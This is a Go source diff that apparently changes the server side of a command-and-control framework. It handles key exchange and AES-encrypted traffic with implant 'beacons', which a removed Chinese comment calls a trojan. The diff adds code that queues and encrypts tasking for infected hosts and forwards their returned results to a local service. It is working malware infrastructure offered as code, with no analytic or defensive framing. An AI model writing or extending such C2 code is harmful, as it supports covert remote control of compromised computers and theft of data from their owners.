@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"math"
 	"math/big"
 	"net"
 	"net/http"
@@ -40,7 +41,7 @@ func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bo
 	}
 }
 
-func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, bool) {
+func POST_handler(body []byte, listener *Listener, r *http.Request, w http.ResponseWriter) ([]byte, bool) {
 
 	var res []byte
 	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
@@ -54,30 +55,19 @@ func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, boo
 			println("2")
 
 			var CusAes big.Int
-			// 从木马接收到的 a^b1, 木马使用小端序, 因此此处通过翻转来按小端序解析
 			CusAes.SetBytes(ReverseBytes(GetBytes(body, 16)))
-
-			Srvkey := Random_Big_Int128() // 私钥 b1
+			Srvkey := Random_Big_Int128()
 			Create_beacon_2(listener, &CusAes, Srvkey, ip, domain, i)
-
-			// 底数 a 也是按小端序存储的, 因此转换成 BigInt 前需要反转
-			// SrvAes 就是 a^b2
 			SrvAes := Mod_Pow(Bytes_To_BigInt(ReverseBytes(listener.A)), Srvkey)
 
-			// 计算 (a^b1)^b2
-			TrueKey_num := Mod_Pow(&CusAes, Srvkey)
+			fmt.Printf("%x", stringToBytes(listener.Beacons[i].AESkey))
 
-			// TrueKey 就是会话密钥, 当然，需要按小端存取, 它可以直接用来创建 AES 加密器
-			TrueKey := ReverseBytes(TrueKey_num.Bytes())
-			printkey(TrueKey) // 打印会话密钥
-
-			// 发送 a^b2 时, 需要以小端序发送
 			res = append(res, ReverseBytes(SrvAes.Bytes())...)
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
 			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte := eAES.DecryptData(GetBytes(body, len(body)))
+			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
 
 			var beacon_tmp Beacon
 
@@ -97,15 +87,21 @@ func POST_handler(body []byte, listener *Listener, r *http.Request) ([]byte, boo
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
 			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte := eAES.DecryptData(GetBytes(body, len(body)))
+			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
 			if json_byte == nil {
 				if is_jobs_null(listener, i) {
 					return res, true // sleep
 				} else {
-
+					res = append(res, make_fucker(listener, i)...)
+					res = eAES.EncryptData(res)
+					return ReverseBytes(res), true
 				}
 			} else {
-
+				remove_job(listener, i)
+				json_byte = append(json_byte, 0x00, IntToUint8(i))
+				Send_Bytes_to(w, json_byte, "http://localhost:50049", expectedHeaders)
+				res = append(res, make_fucker(listener, i)...)
+				res = eAES.EncryptData(res)
 				return res, true // commit
 			}
 
@@ -160,4 +156,13 @@ func Debug_ip(listener *Listener, ip string) {
 		}
 	}
 
+}
+
+func IntToUint8(num int) uint8 {
+	// 检查是否溢出
+	if num < 0 || num > math.MaxUint8 {
+		return 0
+	}
+
+	return uint8(num)
 }
